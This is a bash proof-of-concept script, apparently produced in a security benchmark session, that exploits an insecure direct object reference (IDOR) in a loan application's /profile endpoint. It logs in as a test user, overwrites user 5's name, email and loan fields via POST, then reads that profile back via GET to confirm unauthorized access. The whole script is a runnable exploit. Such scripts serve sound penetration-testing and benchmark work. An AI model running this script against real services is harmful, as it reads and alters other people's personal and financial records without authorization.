#!/bin/bash
# POC: POC for IDOR vulnerability in profile retrieval (GET endpoint) - demonstrates unauthorized access to other users' profiles
# Target: ./repo
# Created: 2025-11-07T19:19:10.913Z
# Session: benchmark-XBEN-063-24-mhp81tzn

# IDOR in Profile Retrieval - Unauthorized Data Access POC
# This script demonstrates the IDOR vulnerability in the /profile GET endpoint

set -e

TARGET_URL="${1:-http://localhost}"
LOGIN_USER="test"
LOGIN_PASS="test"

echo "[*] IDOR in Profile Retrieval Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login as test user to get session cookie
echo "[*] Step 1: Logging in as user '$LOGIN_USER' to obtain session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$LOGIN_USER&password=$LOGIN_PASS")

if [[ $LOGIN_RESPONSE == *"302"* ]] || [[ -f /tmp/cookies.txt ]]; then
  echo "[+] Login successful"
else
  echo "[-] Login failed"
  exit 1
fi

# Step 2: Create a known profile for user_id=5 by modifying it
echo ""
echo "[*] Step 2: Creating known test data for user_id=5 via POST..."
curl -s -b /tmp/cookies.txt \
  -X POST "$TARGET_URL/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=5&name=User5&lastname=TestUser&email=user5@example.com&loan_amount=5000&loan_term_months=48&monthly_payment=120" \
  > /dev/null 2>&1

echo "[+] Test data created for user_id=5"

# Step 3: Attempt to read user_id=5's profile via GET IDOR
echo ""
echo "[*] Step 3: Attempting to retrieve user_id=5's profile via GET (unauthorized access)..."
PROFILE_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/profile?id=5")

# Step 4: Validate that we got unauthorized data
echo ""
echo "[*] Step 4: Analyzing response..."

if echo "$PROFILE_RESPONSE" | grep -q "User5"; then
  echo "[+] VULNERABILITY CONFIRMED: Successfully retrieved user_id=5's profile data"
  echo "[+] Profile data retrieved:"
  echo "$PROFILE_RESPONSE" | grep -E "(User5|TestUser|user5@example.com|5000|48|120)" | head -10
  echo ""
  echo "[+] IDOR Vulnerability Details:"
  echo "    - Logged in as: user_id=1 (test user)"
  echo "    - Accessed profile: user_id=5"
  echo "    - Status: Unauthorized read succeeded"
  echo "    - Data exposed: Name, Email, Loan Amount, Loan Terms"
  exit 0
else
  echo "[-] Could not confirm vulnerability - response did not contain expected data"
  echo "[-] Response snippet: ${PROFILE_RESPONSE:0:200}"
  exit 1
fi